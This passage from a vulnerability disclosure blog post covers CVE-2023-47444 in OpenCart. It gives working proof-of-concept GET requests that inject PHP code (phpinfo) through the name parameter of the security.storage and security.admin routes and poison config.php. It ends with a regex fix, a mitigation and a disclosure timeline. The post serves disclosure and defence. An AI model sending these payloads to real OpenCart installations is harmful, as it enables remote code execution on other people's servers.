</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin_secret\/index.php?route=common\/security.storage&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;name=pwned');phpinfo();#&amp;path=\/home\/kali\/Projects\/OpenCart\/4.0.2.3\/&amp;page=2"}
</pre></td></tr></tbody></table></code></div></div>

<p>The second one to: <code class="language-plaintext highlighter-rouge">route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;&amp;page=99</code></p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/admin_secret/index.php?route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=/home/kali/Projects/OpenCart/4.0.2.3/&amp;user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&amp;page=99</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"success":"Success: Storage directory has been moved!"}
</pre></td></tr></tbody></table></code></div></div>

<p>Now every page will include the poisoned <code class="language-plaintext highlighter-rouge">config.php</code> file, executing the injected code (in our case the <code class="language-plaintext highlighter-rouge">phpinfo()</code> function):</p>

<p class="text-center"><a href="/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/storage-rce.png" alt="storage-rce" loading="lazy"></a></p>

<p><strong>Demo</strong>:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/auTky_gm8Rk?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>

<h4 id="poc-for-commonsecurityadmin"><span class="me-2">PoC for common/security.admin</span><a href="#poc-for-commonsecurityadmin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The vulnerability in <code class="language-plaintext highlighter-rouge">common/security.admin</code> can also be exploited by sending two different GET requests.</p>

<p>The first one to: <code class="language-plaintext highlighter-rouge">route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=1&amp;name=foo%27);phpinfo();print(%27</code></p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=1&amp;name=foo%27);phpinfo();print(%27</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin\/index.php?route=common\/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;name=foo');phpinfo();print('&amp;page=2"}
</pre></td></tr></tbody></table></code></div></div>

<p>The second one to: <code class="language-plaintext highlighter-rouge">route=common/security.admin&amp;user_token=&lt;token&gt;&amp;page=99&amp;name=foo%27);phpinfo();print(%27</code></p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/admin/index.php?route=common/security.admin&amp;user_token=7cc69dfa3112eb181c75da78147d8af1&amp;page=99&amp;name=foo%27);phpinfo();print(%27</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8888</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">OCSESSID=fbc47c7e5098550f0c12070be0</span>

--- RESPONSE ---

HTTP/1.1 200 OK

{"redirect":"http:\/\/127.0.0.1:8888\/foo');phpinfo();print('\/index.php?route=common\/login"}

</pre></td></tr></tbody></table></code></div></div>

<p>In this case, a new directory containing the poinsoned <code class="language-plaintext highlighter-rouge">config.php</code> file will be created:</p>

<p class="text-center"><a href="/assets/img/opencart-rce-CVE-2023-47444/admin-rce.png" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/admin-rce.png" alt="admin-rce" loading="lazy"></a></p>

<p><strong>Demo</strong>:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/6if6Kfsb2oM?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>

<h3 id="mitigations-and-hotfix"><span class="me-2">Mitigations and hotfix</span><a href="#mitigations-and-hotfix" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Fixing the misconfigured regexes (pull reqeust <a href="https://github.com/opencart/opencart/pull/12949">#12949</a>) should prevent the exploitation in both the scenarios:</p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="o">+</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9_]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9_\:\/]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
<span class="o">+</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9_\:\/]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">@@</span> <span class="o">-</span><span class="mi">282</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">282</span><span class="p">,</span><span class="mi">7</span> <span class="o">@@</span> <span class="k">public</span> <span class="k">function</span> <span class="n">admin</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
<span class="o">-</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-Z0-9]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="o">+</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Furthermore, disable the <code class="language-plaintext highlighter-rouge">common/security</code> role for every user until a patch will be available.<br />
16/11/2023 update: A partial fix only affecting the <code class="language-plaintext highlighter-rouge">storage</code> function (<a href="https://github.com/opencart/opencart/pull/12951">#12951</a>) has been merged to master.</p>

<h3 id="disclosure-timeline"><span class="me-2">Disclosure Timeline</span><a href="#disclosure-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<blockquote>
  <p><em>Please refer to the <a href="http://localhost:4000/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.</em><br /></p>
</blockquote>

<ul>
  <li><strong>14/10/2023</strong>: Discovered both the vulnerabilities in <code class="language-plaintext highlighter-rouge">opencart/upload/admin/controller/common/security.php</code><br /></li>
  <li><strong>17/10/2023</strong>: Contacted OpenCart at <code class="language-plaintext highlighter-rouge">support@opencart.com</code> (without receiving any response).<br /></li>
  <li><strong>24/10/2023</strong>: Contacted OpenCart at <code class="language-plaintext highlighter-rouge">webmaster@opencart.com</code>.<br /></li>
  <li><strong>30/10/2023</strong>: Following the official <a href="https://github.com/opencart/opencart#reporting-a-bug">guidelines</a>, published a <a href="https://forum.opencart.com/viewtopic.php?t=232348">post</a> on the official OpenCart forum.<br /></li>
  <li><strong>02/11/2023</strong>: Sent a PM to an Administrator on the official OpenCart forum.<br /></li>
  <li><strong>10/11/2023</strong>: Assigned <a href="https://www.cve.org/CVERecord?id=CVE-2023-47444">CVE-2023-47444</a></li>
  <li><strong>10/11/2023</strong>: Sent a PM to another Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff.<br /></li>
  <li><strong>11/11/2023</strong>: Get a <em>kindly</em> response from an OpenCart Administrator
<a href="/assets/img/opencart-rce-CVE-2023-47444/email.png" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/email.png" alt="email" width="550" loading="lazy"></a></li>
  <li><strong>14/11/2023</strong>: Public release and opened a GitHub issue (<a href="https://github.com/opencart/opencart/issues/12947">#12947</a>)</li>
  <li><strong>15/11/2023</strong>: Opened a pull request (<a href="https://github.com/opencart/opencart/pull/12949">#12949</a>) with a hotfix, but closed immediately by administrator. GitHub issue also closed by administrator after having marked it as spam and a “non vulnerability”.</li>
  <li><strong>16/11/2023</strong>: Partial fix - only affecting the <code class="language-plaintext highlighter-rouge">storage</code> function (<a href="https://github.com/opencart/opencart/pull/12951">#12951</a>) merged to master</li>
</ul>

<hr />

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:basename">
      <p><a href="https://www.php.net/manual/en/function.basename.php"><code class="language-plaintext highlighter-rouge">basename</code></a>, php.net <a href="#fnref:basename" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a> <a href="#fnref:basename:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;<sup>2</sup></a></p>
    </li>
    <li id="fn:3763">
      <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-3763">CVE-2011-3763</a>, nvd.nist.gov <a href="#fnref:3763" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:1891">
      <p><a href="https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-2935892">CVE-2013-1891</a>, security.snyk.io <a href="#fnref:1891" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
  </ol>
</div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/disclosed-vulnerabilities/">Disclosed Vulnerabilities</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/php/"
            class="post-tag no-text-decoration"
          >PHP</a>
        
          <a
            href="/tags/rce/"
            class="post-tag no-text-decoration"
          >rce</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Authenticated%20Static%20Code%20Injections%20in%20OpenCart%20(CVE-2023-47444)%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fopencart-CVE-2023-47444%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Authenticated%20Static%20Code%20Injections%20in%20OpenCart%20(CVE-2023-47444)%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fopencart-CVE-2023-47444%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fopencart-CVE-2023-47444%2F&text=Authenticated%20Static%20Code%20Injections%20in%20OpenCart%20(CVE-2023-47444)%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fopencart-CVE-2023-47444%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fopencart-CVE-2023-47444%2F&title=Authenticated%20Static%20Code%20Injections%20in%20OpenCart%20(CVE-2023-47444)%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1754949600"
  data-df="ll"
  
>
  Aug 12, 2025
</time>

              <h4 class="pt-0 my-2">Vtenext 25.02 vulnerability research</h4>
              <div class="text-muted">
                <p>Multiple vulnerabilities in vtenext 25.02.1 and prior versions allow unauthenticated attackers to bypass authentication through three separate vectors, ultimately leading to remote code execution on the underlying server.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/waf-bypass-exploiting-parser-differentials/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1681250400"
  data-df="ll"
  
>
  Apr 12, 2023
</time>

              <h4 class="pt-0 my-2">WAF bypass and vulnerability chain exploiting parser differentials</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/bypassing-addslashes-using-format-string-to-get-sql-injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1632780000"
  data-df="ll"
  
>
  Sep 28, 2021
</time>

              <h4 class="pt-0 my-2">Bypassing addslashes() using format string to get SQL Injection</h4>
              <div class="text-muted">
                <p>Learn how to bypass the addslashes() function using format strings and get SQL Injection in this HackTheBox challange called baby sql.</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/digital-private-vault/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Digital Private Vault (APK) - Subverting an (in)secure Android vault</p>
    </a>
  

  
    <a
      href="/posts/come-non-reagire-a-una-resp-discloure/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>How NOT to react to a responsible disclosure (CVE-2023-47444)</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by ☕, 🐛🐜🐞, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
